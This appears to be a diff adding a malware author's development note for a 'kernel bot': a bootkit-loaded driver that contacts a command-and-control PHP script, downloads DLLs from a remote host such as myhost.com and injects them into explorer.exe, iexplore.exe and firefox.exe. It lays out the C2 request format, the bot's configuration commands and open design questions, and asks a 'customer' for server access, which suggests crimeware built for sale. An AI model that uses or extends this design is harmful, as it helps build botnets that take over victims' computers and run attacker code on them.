@@ -1,0 +1,38 @@
+Kernel bot
+
+Currently the following functions are available:
+The bot is implemented as a driver that is loader with a bootkit-loader. The driver has its own TCP/IP stack and HTTP implementation.
+Once initialized, the bot creates a times it uses to connect(HTTP) to predefined URL pointing at PHP script. The script returns a configuration file.
+The configuration file contains commands, like:
+"DLL: http://myhost.com/myfile.dll, file1.dll, explorer.exe iexplore.exe firefox.exe"
+The bot downloads(over HTTP) myhost.com/myfile.dll file and stores it on VFS partition with file1.dll filename. It also registers file1.dll file to be automatically injected into the following processes: explorer.exe, iexplore.exe, firefox.exe.
+
+What's required for further development:
+
+1. Agree on the configuration file format
+At the moment a simple text file is used, like the one described above.
+Possibly, it makes sense to add the following parameters to the config file:
+- callback servers list that will be used for receiving the configuration file
+- string(script and parameters) for retrieving the configuration file and the re-connect period. What else?
+Possibly, a some sort of a converter(configurator) should be used for formatting the configuration file with the view to remove the text parser from the bot. This will reduce its size and minimize a chance of an error.
+
+Commands format: Commands for adding, deleting, refreshing, etc. the DLL file. Driver administration/operation commands?
+
+2. Agree on configuration file request format
+At the moment the bot works on our test server with the following format:
+GET /config.php?version=100&user=1234&server=1&id=1000&crc=3201b37f
+where: version = bot version, user = unique client ID, server = server ID, id = bot's group, crc - previous configuration file CRC32, used to stop the server for sending the same configuration file again.
+
+What to change:
+- request type: GET or POST ?
+- name of the script that returns the configuration file
+- script parameters: client ID, bot version, server ID, previous configuration file CRC32, anything else?
+- additional parameters for HTTP request: OS architecture and version(User-Agent), Refer, anything else?
+- ?
+
+3. Anything else that I missed?
+
+If a customer already has the server with administration panel and enabled to issue the configuration files, please provide the following
+- configuration file description
+- communication protocol description
+also, would like to have a temporary access to the server to allow me to adjust the bot according to customer's protocols used and for further testing.
